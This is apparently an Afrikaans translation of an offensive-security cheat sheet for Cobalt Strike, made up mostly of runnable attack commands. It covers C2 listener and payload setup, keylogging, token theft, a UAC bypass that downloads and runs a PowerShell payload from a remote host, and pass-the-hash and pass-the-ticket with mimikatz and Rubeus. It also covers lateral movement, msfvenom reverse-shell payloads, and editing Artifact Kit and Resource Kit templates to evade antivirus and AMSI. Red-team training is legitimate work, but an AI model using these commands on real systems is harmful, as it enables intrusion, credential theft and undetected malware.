# Cobalt Strike

### Luisteraars

### C2 Luisteraars

`Cobalt Strike -> Luisteraars -> Voeg by/Wysig` dan kan jy kies waar om te luister, watter soort beacon om te gebruik (http, dns, smb...) en meer.

### Peer2Peer Luisteraars

Die beacons van hierdie luisteraars hoef nie direk met die C2 te kommunikeer nie, hulle kan met dit kommunikeer deur ander beacons.

`Cobalt Strike -> Luisteraars -> Voeg by/Wysig` dan moet jy die TCP of SMB beacons kies

* Die **TCP beacon sal 'n luisteraar in die geselekteerde poort stel**. Om met 'n TCP beacon te verbind, gebruik die opdrag `connect <ip> <port>` vanaf 'n ander beacon
* Die **smb beacon sal luister in 'n pipenaam met die geselekteerde naam**. Om met 'n SMB beacon te verbind, moet jy die opdrag `link [target] [pipe]` gebruik.

### Genereer & Gasheer payloads

#### Genereer payloads in lêers

`Aanvalle -> Pakkette ->`

* **`HTMLApplication`** vir HTA lêers
* **`MS Office Macro`** vir 'n kantoor dokument met 'n makro
* **`Windows Executable`** vir 'n .exe, .dll of diens .exe
* **`Windows Executable (S)`** vir 'n **stageless** .exe, .dll of diens .exe (beter stageless as staged, minder IoCs)

#### Genereer & Gasheer payloads

`Aanvalle -> Web Drive-by -> Geskepte Web Aflewering (S)` Dit sal 'n skrip/executable genereer om die beacon van cobalt strike af te laai in formate soos: bitsadmin, exe, powershell en python

#### Gasheer Payloads

As jy reeds die lêer het wat jy wil gasheer in 'n webbediener, gaan net na `Aanvalle -> Web Drive-by -> Gasheer Lêer` en kies die lêer om te gasheer en webbediener konfigurasie.

### Beacon Opsies

<pre class="language-bash"><code class="lang-bash"># Voer plaaslike .NET binêre uit
execute-assembly </path/to/executable.exe>

# Skermskote
printscreen    # Neem 'n enkele skermskoot via PrintScr metode
screenshot     # Neem 'n enkele skermskoot
screenwatch    # Neem periodieke skermskote van lessenaar
## Gaan na View -> Skermskote om hulle te sien

# keylogger
keylogger [pid] [x86|x64]
## View > Toetsaanslae om die getypte sleutels te sien

# poortskandering
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Spuit portscan aksie binne 'n ander proses
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Importeer Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell <skryf net powershell cmd hier>

# Gebruiker impersonasie
## Token generasie met kredensiale
make_token [DOMAIN\user] [password] #Skep token om 'n gebruiker in die netwerk te impersonate
ls \\computer_name\c$ # Probeer om die gegenereerde token te gebruik om toegang tot C$ in 'n rekenaar te verkry
rev2self # Stop om die token wat met make_token gegenereer is te gebruik
## Die gebruik van make_token genereer gebeurtenis 4624: 'n rekening is suksesvol aangemeld. Hierdie gebeurtenis is baie algemeen in 'n Windows-domein, maar kan beperk word deur op die Aanmeldtipe te filter. Soos hierbo genoem, gebruik dit LOGON32_LOGON_NEW_CREDENTIALS wat tipe 9 is.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steel token van pid
## Soos make_token maar steel die token van 'n proses
steal_token [pid] # Ook, dit is nuttig vir netwerk aksies, nie plaaslike aksies nie
## Vanuit die API dokumentasie weet ons dat hierdie aanmeldtipe "die oproeper toelaat om sy huidige token te kloon". Dit is waarom die Beacon-uitvoer sê Impersonated <current_username> - dit impersonate ons eie gekloonde token.
ls \\computer_name\c$ # Probeer om die gegenereerde token te gebruik om toegang tot C$ in 'n rekenaar te verkry
rev2self # Stop om die token van steal_token te gebruik

## Begin proses met nuwe kredensiale
spawnas [domain\username] [password] [listener] #Doen dit vanaf 'n gids met lees toegang soos: cd C:\
## Soos make_token, sal dit Windows gebeurtenis 4624 genereer: 'n rekening is suksesvol aangemeld maar met 'n aanmeldtipe van 2 (LOGON32_LOGON_INTERACTIVE). Dit sal die oproep gebruiker (TargetUserName) en die geïmpersoniseerde gebruiker (TargetOutboundUserName) detail.

## Spuit in proses
inject [pid] [x64|x86] [listener]
## Vanuit 'n OpSec oogpunt: Moet nie kruis-platform inspuitings uitvoer tensy jy regtig moet nie (bv. x86 -> x64 of x64 -> x86).

## Pass the hash
## Hierdie wysigingsproses vereis die patching van LSASS geheue wat 'n hoë risiko aksie is, vereis plaaslike admin regte en is nie al te lewensvatbaar as Protected Process Light (PPL) geaktiveer is nie.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash deur mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Sonder /run, spaw mimikatz 'n cmd.exe, as jy as 'n gebruiker met Desktop loop, sal hy die shell sien (as jy as SYSTEM loop, is jy reg om te gaan)
steal_token <pid> #Steel token van proses geskep deur mimikatz

## Pass the ticket
## Versoek 'n kaartjie
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Skep 'n nuwe aanmeldsessie om met die nuwe kaartjie te gebruik (om nie die gecompromitteerde een te oorskry nie)
make_token <domain>\<username> DummyPass
## Skryf die kaartjie in die aanvaller masjien vanaf 'n poweshell sessie & laai dit
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket van SYSTEM
## Genereer 'n nuwe proses met die kaartjie
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steel die token van daardie proses
steal_token <pid>

## Onttrek kaartjie + Pass the ticket
### Lys kaartjies
execute-assembly C:\path\Rubeus.exe triage
### Dump interessante kaartjie deur luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Skep nuwe aanmeldsessie, let op luid en prosesid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Voeg kaartjie in genereer aanmeldsessie
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Laastens, steel die token van daardie nuwe proses
steal_token <pid>

# Laterale Beweging
## As 'n token geskep is, sal dit gebruik word
jump [method] [target] [listener]
## Metodes:
## psexec                    x86   Gebruik 'n diens om 'n Service EXE artefak uit te voer
## psexec64                  x64   Gebruik 'n diens om 'n Service EXE artefak uit te voer
## psexec_psh                x86   Gebruik 'n diens om 'n PowerShell een-liner uit te voer
## winrm                     x86   Voer 'n PowerShell skrip via WinRM uit
## winrm64                   x64   Voer 'n PowerShell skrip via WinRM uit

remote-exec [method] [target] [command]
## Metodes:
<strong>## psexec                          Afgeleë uitvoering via Diensbeheerder
</strong>## winrm                           Afgeleë uitvoering via WinRM (PowerShell)
## wmi                             Afgeleë uitvoering via WMI

## Om 'n beacon met wmi uit te voer (dit is nie in die jump opdrag nie) laai net die beacon op en voer dit uit
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass sessie na Metasploit - Deur luisteraar
## Op metaploit gasheer
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Op cobalt: Luisteraars > Voeg by en stel die Payload op Buitelandse HTTP. Stel die Gasheer op 10.10.5.120, die Poort op 8080 en klik Stoor.
beacon> spawn metasploit
## Jy kan slegs x86 Meterpreter sessies met die buitelandse luisteraar spaw.

# Pass sessie na Metasploit - Deur shellcode inspuiting
## Op metasploit gasheer
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Voer msfvenom uit en berei die multi/handler luisteraar voor

## Kopieer bin lêer na cobalt strike gasheer
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inspuit metasploit shellcode in 'n x64 proses

# Pass metasploit sessie na cobalt strike
## Genereer stageless Beacon shellcode, gaan na Aanvalle > Pakkette > Windows Executable (S), kies die gewenste luisteraar, kies Raw as die Uitvoer tipe en kies Gebruik x64 payload.
## Gebruik post/windows/manage/shellcode_inject in metasploit om die gegenereerde cobalt strike shellcode in te spuit


# Pivoting
## Maak 'n socks proxy in die spanbediener
beacon> socks 1080

# SSH verbinding
beacon> ssh 10.10.17.12:22 gebruikersnaam wagwoord</code></pre>

## Vermy AVs

### Artefak Kit

Gewoonlik in `/opt/cobaltstrike/artifact-kit` kan jy die kode en vooraf-gecompileerde templates (in `/src-common`) van die payloads wat cobalt strike gaan gebruik om die binêre beacons te genereer, vind.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) met die gegenereerde agterdeur (of net met die gecompileerde template) kan jy vind wat die verdediger laat afgaan. Dit is gewoonlik 'n string. Daarom kan jy net die kode wat die agterdeur genereer, wysig sodat daardie string nie in die finale binêre verskyn nie.

Na die wysiging van die kode, voer net `./build.sh` uit vanaf dieselfde gids en kopieer die `dist-pipe/` gids na die Windows kliënt in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Moet nie vergeet om die aggressiewe skrif `dist-pipe\artifact.cna` te laai om Cobalt Strike aan te dui om die hulpbronne van die skyf te gebruik wat ons wil hê en nie diegene wat gelaai is nie.

### Hulpbronstel

Die Hulpbronstel-gids bevat die sjablone vir Cobalt Strike se skrif-gebaseerde payloads, insluitend PowerShell, VBA en HTA.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) saam met die sjablone te gebruik, kan jy vind wat die verdediger (AMSI in hierdie geval) nie hou nie en dit aanpas:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Deur die gedetecteerde lyne te wysig, kan 'n sjabloon gegenereer word wat nie gevang sal word nie.

Moet nie vergeet om die aggressiewe skrip `ResourceKit\resources.cna` te laai om Cobalt Strike aan te dui om die hulpbronne van die skyf te gebruik wat ons wil hê en nie diegene wat gelaai is nie.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

